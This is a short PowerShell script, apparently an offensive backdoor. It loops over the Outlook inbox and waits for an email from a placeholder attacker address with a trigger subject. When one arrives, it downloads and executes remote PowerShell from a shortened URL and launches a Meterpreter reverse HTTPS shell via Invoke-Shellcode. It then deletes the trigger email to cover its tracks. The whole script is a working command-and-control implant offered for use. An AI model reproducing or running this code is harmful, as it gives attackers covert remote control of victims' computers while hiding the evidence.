While($True){
$olFolderInbox = 6
$outlook = new-object -com outlook.application;
$ns = $outlook.GetNameSpace("MAPI");
$inbox = $ns.GetDefaultFolder($olFolderInbox)
$Emails = $inbox.items
$Emails | foreach { 
if($_.SenderEmailAddress -match "ATTACKEREMAIL@EMAIL.COM" -and $_.subject -match "TRIGGERTEXT")
{Start-Job -ScriptBlock {$WebClientObject = New-Object Net.WebClient
IEX $WebClientObject.DownloadString('http://goo.gl/yfLfQB')
Invoke-Shellcode -Payload windows/meterpreter/reverse_https -LHOST xxx.xxx.x.xxx -LPORT 1111 -Force}

}}
$Emails | foreach { 
if($_.SenderEmailAddress -match "ATTACKEREMAIL@EMAIL.COM" -and $_.subject -match "TRIGGERTEXT")
{$OutlookFolders = $outlook.Session.Folders.Item(1).Folders
$EmailInFolderToDelete = $outlook.Session.Folders.Item(1).Folders.Item("Inbox").Items
$EmailToDelete = $EmailInFolderToDelete | Where-Object {$_.Subject -eq "TRIGGERTEXT" -and $_.SenderEmailAddress -eq "ATTACKEREMAIL@EMAIL.COM"}
$EmailToDelete.Delete() }


}
#This determines how often the script checks in. Lower sleep time == more noise  
Start-Sleep -s 10 
  
}
